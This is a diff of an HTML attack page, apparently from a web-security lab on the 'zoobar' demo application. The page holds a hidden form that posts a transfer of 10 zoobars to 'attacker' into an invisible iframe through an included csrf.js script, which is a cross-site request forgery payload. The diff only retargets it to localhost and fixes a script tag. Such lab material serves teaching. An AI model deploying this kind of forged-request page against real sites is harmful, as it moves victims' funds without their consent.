@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="http://192.168.56.101/zoobar-ps/transfer.php" id="post_form"
+    <form action="http://localhost/zoobar/transfer.php" id="post_form"
           method="post" enctype="application/x-www-form-urlencoded">
       <input type="hidden" name="recipient" value="attacker" />
       <input type="hidden" name="zoobars" value="10" />
@@ -10,6 +10,6 @@
     <iframe id="form_target" name="form_target" style="visibility: hidden;">      
     </iframe>
     
-    <script type="text/javascript" src="csrf.js" />
+    <script type="text/javascript" src="csrf.js"></script>
   </body>
 </html>
